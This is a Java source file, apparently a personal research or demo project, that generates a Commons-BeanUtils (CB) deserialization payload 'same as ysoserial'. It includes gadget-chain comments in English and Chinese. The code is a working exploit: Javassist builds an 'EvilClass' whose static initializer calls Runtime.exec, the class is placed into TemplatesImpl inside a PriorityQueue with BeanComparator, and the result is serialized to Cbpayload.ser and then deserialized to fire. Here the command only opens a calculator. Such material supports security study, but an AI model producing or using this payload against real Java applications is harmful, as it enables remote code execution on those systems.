package priv.ga0weI.demoshrio;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @author  ga0weI
 * @deprecated  for cb payload ,same as ysoserial
 */

//
//
//Gadget chain:
//        ObjectInputStream.readObject()
//        PriorityQueue.readObject()
//        PriorityQueue.heapify()
//        PriorityQueue.siftDown()
//        siftDownUsingComparator()
//        BeanComparator.compare()
//        TemplatesImpl.getOutputProperties()
//        TemplatesImpl.newTransformer()
//        TemplatesImpl.getTransletInstance()
//        TemplatesImpl.defineTransletClasses()
//        TemplatesImpl.TransletClassLoader.defineClass()
//        Pwner*(Javassist-generated).<static init>
//        Runtime.exec()


//Gadget chain:
//        SINK点：
//          ObjectInputStream.readObject()
//            PriorityQueue.readObject()
//              PriorityQueue.heapify()
//                  PriorityQueue.siftDown()
//                      siftDownUsingComparator()
//                       BeanComparator.compare()
//                          PropertyUtils.getProperty
//                        命令执行：
//                           TemplatesImpl.getOutputProperties()
//                               TemplatesImpl.newTransformer()
//                                  TemplatesImpl.getTransletInstance()
//                                   TemplatesImpl.defineTransletClasses()
//                                      TemplatesImpl.TransletClassLoader.defineClass()
//                                           Evalclass(by Javassist).<static init>
//                                               Runtime.exec()


public class Cbs {

        // 修改值的方法，简化代码
        public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        }

        public static void main(String[] args) throws Exception {
            // 创建恶意类，用于报错抛出调用链
            ClassPool pool = ClassPool.getDefault();
            CtClass payload = pool.makeClass("EvilClass");
            payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
//            payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");

            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
//            CtMethod ctMethod = new CtMethod(CtClass.voidType,"transform",new CtClass[]{CtClass.byteType,CtClass.intType},payload);
//            ctMethod.setBody("");
//            ctMethod.setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
//            payload.addMethod(ctMethod);

//            payload.makeNestedClass("transform",false);

            byte[] evilClass = payload.toBytecode();

            FileOutputStream fos = new FileOutputStream(new File("payload.class"));
            fos.write(evilClass);
            fos.flush();
            fos.close();

            // set field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
            setFieldValue(templates, "_name", "ga0weI");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            // 创建序列化对象
            BeanComparator beanComparator = new BeanComparator();
            PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
            queue.add(1);
            queue.add(1);

            // 修改值
            setFieldValue(beanComparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{templates, templates});

            // 反序列化
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("Cbpayload.ser"));
            out.writeObject(queue);
            ObjectInputStream in = new ObjectInputStream(new FileInputStream("Cbpayload.ser"));
            in.readObject();
        }


}
